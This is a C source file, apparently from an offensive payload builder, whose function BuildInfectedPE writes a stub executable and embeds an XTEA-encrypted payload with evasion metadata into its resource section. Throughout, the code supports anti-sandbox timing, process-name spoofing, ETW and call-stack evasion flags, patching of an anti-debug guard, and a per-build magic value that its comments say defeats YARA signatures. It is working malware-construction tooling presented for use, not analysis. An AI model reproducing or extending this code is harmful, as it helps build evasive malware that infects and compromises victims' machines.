#include "PeBuilder.h"
#include "OpsecFlags.h"
#include <stdio.h>
#include <string.h>

BOOL ReadFileToBuffer(const char* filePath, BYTE** outBuffer, DWORD* outSize) {
    HANDLE hFile = CreateFileA(filePath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;

    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE || fileSize == 0) {
        CloseHandle(hFile);
        return FALSE;
    }

    *outBuffer = (BYTE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, fileSize);
    if (!*outBuffer) {
        CloseHandle(hFile);
        return FALSE;
    }

    DWORD bytesRead;
    if (!ReadFile(hFile, *outBuffer, fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
        HeapFree(GetProcessHeap(), 0, *outBuffer);
        *outBuffer = NULL;
        CloseHandle(hFile);
        return FALSE;
    }

    *outSize = fileSize;
    CloseHandle(hFile);
    return TRUE;
}

BOOL WriteBufferToFile(const char* filePath, const BYTE* inBuffer, DWORD inSize) {
    HANDLE hFile = CreateFileA(filePath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;

    DWORD bytesWritten;
    BOOL bResult = WriteFile(hFile, inBuffer, inSize, &bytesWritten, NULL);
    
    CloseHandle(hFile);
    return bResult && (bytesWritten == inSize);
}

// Modern variant - embedding Payload as a Resource (.rsrc).
// Note: Authenticode hash covers .rsrc — payload must be embedded BEFORE signing.

BOOL BuildInfectedPE(const char* stubPath, const char* outputPath,
                     const BYTE* payloadBuffer, SIZE_T payloadSize,
                     ULONG originalDecompressedSize, DWORD mutatedStubSize,
                     const DWORD key_salt[4], const BYTE dll_indices[3],
                     DWORD exportHash, const char* pExportArg,
                     const char* pSpoofExe,
                     const char* pSemaphoreName,
                     DWORD sleepFwdMs,
                     DWORD uptimeMin,
                     DWORD hammerMs,
                     DWORD opsecFlags)
{
    printf("[*] Preparing Output Image: %s\n", outputPath);

    // 1. Load stub.bin to memory so we can optionally patch it before writing.
    BYTE* pStubBuf    = NULL;
    DWORD stubBufSize = 0;
    if (!ReadFileToBuffer(stubPath, &pStubBuf, &stubBufSize)) {
        printf("[!] Error reading stub.bin: %s  Error: %lu\n", stubPath, GetLastError());
        return FALSE;
    }

    // 2. --no-tls: find the 5-byte TLS guard marker and set byte[4] = 0 to
    //    disable the TLS anti-debug callback at runtime.
    //    The marker is: { 0xCA, 0xFE, 0xF0, 0x0D, 0x01 } in TlsCallback.c.
    if (opsecFlags & OPSEC_FLAG_NO_TLS) {
        static const BYTE tlsMarker[4] = { 0xCA, 0xFE, 0xF0, 0x0D };
        BOOL found = FALSE;
        for (DWORD i = 0; i + 4 < stubBufSize; i++) {
            if (pStubBuf[i]   == tlsMarker[0] && pStubBuf[i+1] == tlsMarker[1] &&
                pStubBuf[i+2] == tlsMarker[2] && pStubBuf[i+3] == tlsMarker[3]) {
                pStubBuf[i + 4] = 0x00;
                found = TRUE;
                break;
            }
        }
        if (!found)
            printf("[!] WARNING: --no-tls: TLS guard marker not found in stub.bin\n");
        else
            printf("[+] TLS anti-debug disabled (stub patched)\n");
    }

    // 3. Write (possibly patched) stub to output path.
    if (!WriteBufferToFile(outputPath, pStubBuf, stubBufSize)) {
        printf("[!] Error writing output file. Error: %lu\n", GetLastError());
        HeapFree(GetProcessHeap(), 0, pStubBuf);
        return FALSE;
    }
    HeapFree(GetProcessHeap(), 0, pStubBuf);

    // Resource layout: [XTEA blob][PAYLOAD_METADATA]
    // sizeof(PAYLOAD_METADATA) = 344, verified at compile time in PeBuilder.h.
    DWORD dwPayloadSize     = (DWORD)payloadSize;
    DWORD totalResourceSize = dwPayloadSize + (DWORD)sizeof(PAYLOAD_METADATA);

    BYTE* resPayload = (BYTE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, totalResourceSize);
    if (!resPayload) {
        printf("[!] Error allocating memory for resource package.\n");
        return FALSE;
    }

    // A. XTEA-encrypted blob at offset 0.
    memcpy(resPayload, payloadBuffer, payloadSize);

    // B. Fill metadata struct immediately after the blob.
    //    HeapAlloc(HEAP_ZERO_MEMORY) already zeroed the buffer — string fields
    //    (exportArg, spoof_exe) are implicitly null-terminated and zero-padded.
    PAYLOAD_METADATA* pMeta = (PAYLOAD_METADATA*)(resPayload + dwPayloadSize);

    memcpy(pMeta->key_salt, key_salt, sizeof(pMeta->key_salt));

    pMeta->dll_idx[0] = dll_indices[0];
    pMeta->dll_idx[1] = dll_indices[1];
    pMeta->dll_idx[2] = dll_indices[2];
    pMeta->pad        = 0;

    pMeta->origSize   = (DWORD)originalDecompressedSize;
    pMeta->stubSize   = mutatedStubSize;
    pMeta->blobSize   = dwPayloadSize;
    pMeta->exportHash = exportHash;

    if (pExportArg && *pExportArg) {
        size_t argLen = strlen(pExportArg);
        if (argLen > sizeof(pMeta->exportArg) - 1) argLen = sizeof(pMeta->exportArg) - 1;
        memcpy(pMeta->exportArg, pExportArg, argLen);
    }

    if (pSpoofExe && *pSpoofExe) {
        size_t nameLen = strlen(pSpoofExe);
        if (nameLen > sizeof(pMeta->spoof_exe) - 1) nameLen = sizeof(pMeta->spoof_exe) - 1;
        memcpy(pMeta->spoof_exe, pSpoofExe, nameLen);
    }

    if (pSemaphoreName && *pSemaphoreName) {
        size_t semLen = strlen(pSemaphoreName);
        if (semLen > sizeof(pMeta->semaphore_name) - 1) semLen = sizeof(pMeta->semaphore_name) - 1;
        memcpy(pMeta->semaphore_name, pSemaphoreName, semLen);
    }
    pMeta->sleep_fwd_ms = sleepFwdMs;
    pMeta->uptime_min   = uptimeMin;
    pMeta->hammer_ms    = hammerMs;

    // OPSEC_FLAG_NO_TLS (bit 3) is embedded for completeness but consumed exclusively
    // by the stub-patching step above; the Stub never reads it at runtime.
    pMeta->flags = opsecFlags;

    // Per-build magic — XOR of the four key_salt words.
    // Stub re-derives this from key_salt to locate the block.
    // No fixed value → no static YARA anchor possible.
    DWORD magic = key_salt[0] ^ key_salt[1] ^ key_salt[2] ^ key_salt[3];
    pMeta->magic = magic;

    printf("[*] Beginning Resource Update for .rsrc injection...\n");
    printf("[*] XTEA key salt: %08X %08X %08X %08X  magic: %08X\n",
           key_salt[0], key_salt[1], key_salt[2], key_salt[3], magic);
    printf("[*] DLL preset indices: %u, %u, %u\n",
           dll_indices[0], dll_indices[1], dll_indices[2]);
    if (exportHash)
        printf("[*] DLL export hash: 0x%08X  arg: \"%s\"\n",
               exportHash, (pExportArg && *pExportArg) ? pExportArg : "(none)");
    printf("[*] OPSEC flags: 0x%08X%s%s%s%s%s%s\n", opsecFlags,
           (opsecFlags & OPSEC_FLAG_NO_ETW)          ? "  no-etw"       : "",
           (opsecFlags & OPSEC_FLAG_NO_CALLSTACK)     ? "  no-callstack" : "",
           (opsecFlags & OPSEC_FLAG_NO_PEB)           ? "  no-peb"       : "",
           (opsecFlags & OPSEC_FLAG_NO_TLS)           ? "  no-tls"       : "",
           (opsecFlags & OPSEC_FLAG_MODULE_OVERLOAD)  ? "  overload"     : "",
           (opsecFlags & OPSEC_FLAG_KEEP_ALIVE)       ? "  keep-alive"   : "");

    // 2. Open Resource Editor
    HANDLE hUpdate = BeginUpdateResourceA(outputPath, FALSE);
    if (!hUpdate) {
        printf("[!] Failed to open executable for Resource updates. Error: %lu\n", GetLastError());
        HeapFree(GetProcessHeap(), 0, resPayload);
        return FALSE;
    }

    // 3. Inject the payload as RCDATA (raw data resource), ID 101
    printf("[*] Committing %lu bytes into Resource ID 101...\n", totalResourceSize);
    if (!UpdateResourceA(hUpdate, RT_RCDATA, MAKEINTRESOURCEA(101), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), resPayload, totalResourceSize)) {
        printf("[!] Failed to inject payload into .rsrc section. Error: %lu\n", GetLastError());
        EndUpdateResourceA(hUpdate, TRUE); // Discard
        HeapFree(GetProcessHeap(), 0, resPayload);
        return FALSE;
    }

    // 4. Save file
    if (!EndUpdateResourceA(hUpdate, FALSE)) {
        printf("[!] Failed to save updated executable. Error: %lu\n", GetLastError());
        HeapFree(GetProcessHeap(), 0, resPayload);
        return FALSE;
    }

    printf("[+] Payload seamlessly embedded into .rsrc section! Total resource size: %lu bytes\n", totalResourceSize);
    HeapFree(GetProcessHeap(), 0, resPayload);
    return TRUE;
}
